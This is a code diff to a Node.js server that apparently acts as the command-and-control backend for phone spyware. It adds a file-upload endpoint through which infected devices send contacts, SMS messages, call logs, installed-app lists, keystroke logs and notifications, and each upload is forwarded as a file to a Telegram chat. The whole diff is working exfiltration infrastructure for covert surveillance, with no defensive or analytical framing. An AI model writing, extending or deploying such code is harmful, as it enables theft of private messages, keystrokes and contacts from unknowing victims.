@@ -1,5 +1,9 @@
 const express = require('express');
 const axios = require('axios');
+const multer = require('multer');
+const fs = require('fs');
+const path = require('path');
+const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -15,8 +19,55 @@ const authorizedChats = new Set([
     '5326373447', // Your chat ID
 ]);
 
+// Create uploads directory if it doesn't exist
+const uploadDir = 'uploads';
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir, { recursive: true });
+}
+
+// ============= FILE UPLOAD CONFIGURATION =============
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, uploadDir);
+    },
+    filename: (req, file, cb) => {
+        const deviceId = req.body.deviceId || 'unknown';
+        const timestamp = Date.now();
+        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
+        cb(null, `${deviceId}-${timestamp}-${safeName}`);
+    }
+});
+
+const upload = multer({
+    storage,
+    limits: { 
+        fileSize: 50 * 1024 * 1024, // 50MB limit (Telegram's limit)
+        fieldSize: 50 * 1024 * 1024
+    },
+    fileFilter: (req, file, cb) => {
+        const allowedTypes = [
+            'text/plain',
+            'text/html',
+            'text/csv',
+            'application/json',
+            'application/octet-stream'
+        ];
+        
+        if (allowedTypes.includes(file.mimetype) || 
+            file.originalname.endsWith('.txt') ||
+            file.originalname.endsWith('.html') ||
+            file.originalname.endsWith('.csv') ||
+            file.originalname.endsWith('.json')) {
+            cb(null, true);
+        } else {
+            cb(new Error('File type not allowed'), false);
+        }
+    }
+});
+
 // Middleware
-app.use(express.json());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // ============= HELPER FUNCTIONS =============
 
@@ -71,29 +122,38 @@ async function sendTelegramMessage(chatId, text) {
     }
 }
 
-async function sendTelegramDocument(chatId, content, filename, caption) {
+async function sendTelegramDocument(chatId, filePath, filename, caption) {
     try {
-        console.log(`📎 Sending document ${filename} to ${chatId}`);
+        console.log(`📎 Sending document to ${chatId}: ${filename}`);
         
-        // Create a buffer from the content
-        const buffer = Buffer.from(content, 'utf-8');
-        
-        // Create form data
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('document', new Blob([buffer]), filename);
+        formData.append('document', fs.createReadStream(filePath), { filename });
         formData.append('caption', caption);
         
         const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
             headers: {
-                'Content-Type': 'multipart/form-data'
-            }
+                ...formData.getHeaders()
+            },
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity
         });
         
         console.log(`✅ Document sent successfully to ${chatId}`);
         return response.data;
     } catch (error) {
         console.error('❌ Error sending document:', error.response?.data || error.message);
+        
+        // If document fails, try sending as message with summary
+        try {
+            const stats = fs.statSync(filePath);
+            await sendTelegramMessage(chatId, 
+                `⚠️ File too large to send directly.\n\n` +
+                `The ${caption} file is ${(stats.size / 1024).toFixed(2)} KB.\n` +
+                `Try using the TXT format instead of HTML for smaller size.`);
+        } catch (e) {
+            console.error('Error sending fallback message:', e);
+        }
         return null;
     }
 }
@@ -626,6 +686,92 @@ async function handleCommand(chatId, command, messageId) {
     await sendTelegramMessage(chatId, ackMessage);
 }
 
+// ============= FILE UPLOAD ENDPOINT =============
+
+app.post('/api/upload-file', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.body.deviceId;
+        const command = req.body.command;
+        const filename = req.body.filename;
+        
+        if (!deviceId || !command || !filename || !req.file) {
+            console.error('❌ Missing fields in upload:', { deviceId, command, filename, hasFile: !!req.file });
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        
+        // Determine caption based on command
+        let caption = '';
+        let count = '';
+        
+        // Try to extract count from filename or use default
+        const countMatch = filename.match(/(\d+)/);
+        if (countMatch) {
+            count = countMatch[1];
+        }
+        
+        switch (command) {
+            case 'contacts_txt':
+            case 'contacts_html':
+                caption = `📇 Contacts Export ${count ? `(${count} contacts)` : ''}`;
+                break;
+            case 'sms_txt':
+            case 'sms_html':
+                caption = `💬 SMS Messages Export ${count ? `(${count} messages)` : ''}`;
+                break;
+            case 'calllogs_txt':
+            case 'calllogs_html':
+                caption = `📞 Call Logs Export ${count ? `(${count} calls)` : ''}`;
+                break;
+            case 'apps_txt':
+            case 'apps_html':
+                caption = `📱 Installed Apps Export ${count ? `(${count} apps)` : ''}`;
+                break;
+            case 'keystrokes_txt':
+            case 'keystrokes_html':
+                caption = `⌨️ Keystroke Logs Export ${count ? `(${count} entries)` : ''}`;
+                break;
+            case 'notifications_txt':
+            case 'notifications_html':
+                caption = `🔔 Notifications Export ${count ? `(${count} notifications)` : ''}`;
+                break;
+            default:
+                caption = `📎 Data Export`;
+        }
+        
+        // Send the file to Telegram
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        // Delete the file after sending (wait a bit to ensure it's sent)
+        setTimeout(() => {
+            try {
+                if (fs.existsSync(filePath)) {
+                    fs.unlinkSync(filePath);
+                    console.log(`🧹 Deleted temporary file: ${filePath}`);
+                }
+            } catch (e) {
+                console.error('Error deleting file:', e);
+            }
+        }, 60000); // Delete after 1 minute
+        
+        res.json({ success: true, filename, size: req.file.size });
+        
+    } catch (error) {
+        console.error('❌ File upload error:', error);
+        res.status(500).json({ error: 'Upload failed: ' + error.message });
+    }
+});
+
 // ============= API ENDPOINTS =============
 
 app.get('/health', (req, res) => {
@@ -677,9 +823,15 @@ app.get('/api/commands/:deviceId', (req, res) => {
 
 app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
-    const { command, result, error, dataType, content } = req.body;
+    const { command, result, error } = req.body;
     
-    console.log(`📨 Result from ${deviceId}:`, { command, dataType, contentLength: content?.length });
+    // Skip if this is a file command (they use the upload endpoint)
+    if (command && (command.includes('_txt') || command.includes('_html'))) {
+        console.log(`📎 File command ${command} using /api/upload-file endpoint`);
+        return res.sendStatus(200);
+    }
+    
+    console.log(`📨 Result from ${deviceId}:`, { command, result: result?.substring(0, 50) });
     
     const device = devices.get(deviceId);
     if (device) {
@@ -687,75 +839,6 @@ app.post('/api/result/:deviceId', async (req, res) => {
         
         if (error) {
             await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
-        } else if (dataType && content) {
-            // Handle file responses
-            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-            let filename, caption;
-            
-            switch (dataType) {
-                case 'contacts_txt':
-                    filename = `contacts_${timestamp}.txt`;
-                    caption = `📇 Contacts Export (${content.length} contacts)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'contacts_html':
-                    filename = `contacts_${timestamp}.html`;
-                    caption = `📇 Contacts Export (HTML)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'sms_txt':
-                    filename = `sms_${timestamp}.txt`;
-                    caption = `💬 SMS Export (${content.length} messages)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'sms_html':
-                    filename = `sms_${timestamp}.html`;
-                    caption = `💬 SMS Export (HTML)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'calllogs_txt':
-                    filename = `call_logs_${timestamp}.txt`;
-                    caption = `📞 Call Logs Export (${content.length} calls)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'calllogs_html':
-                    filename = `call_logs_${timestamp}.html`;
-                    caption = `📞 Call Logs Export (HTML)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'apps_txt':
-                    filename = `apps_${timestamp}.txt`;
-                    caption = `📱 Apps List Export (${content.length} apps)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'apps_html':
-                    filename = `apps_${timestamp}.html`;
-                    caption = `📱 Apps List Export (HTML)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'keystrokes_txt':
-                    filename = `keystrokes_${timestamp}.txt`;
-                    caption = `⌨️ Keystrokes Export (${content.length} entries)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'keystrokes_html':
-                    filename = `keystrokes_${timestamp}.html`;
-                    caption = `⌨️ Keystrokes Export (HTML)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'notifications_txt':
-                    filename = `notifications_${timestamp}.txt`;
-                    caption = `🔔 Notifications Export (${content.length} notifications)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                case 'notifications_html':
-                    filename = `notifications_${timestamp}.html`;
-                    caption = `🔔 Notifications Export (HTML)`;
-                    await sendTelegramDocument(chatId, content, filename, caption);
-                    break;
-                default:
-                    await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
-            }
         } else {
             await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
         }
@@ -876,11 +959,14 @@ app.get('/test-help', async (req, res) => {
     res.json({ success: !!result, result });
 });
 
+// ============= START SERVER =============
+
 app.listen(PORT, '0.0.0.0', () => {
     console.log('\n🚀 ===============================================');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+    console.log(`🚀 Upload directory: ${uploadDir}`);
     console.log('\n📱 NEW FILE-BASED COMMANDS:');
     console.log('   └─ /contacts_txt     - Contacts as TXT file');
     console.log('   └─ /contacts_html    - Contacts as HTML file');
@@ -894,5 +980,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ /keystrokes_html  - Keystrokes as HTML file');
     console.log('   └─ /notifications_txt - Notifications as TXT file');
     console.log('   └─ /notifications_html - Notifications as HTML file');
-    console.log('\n🚀 ===============================================\n');
+    console.log('\n🚀 File size limit: 50MB');
+    console.log('🚀 ===============================================\n');
 });
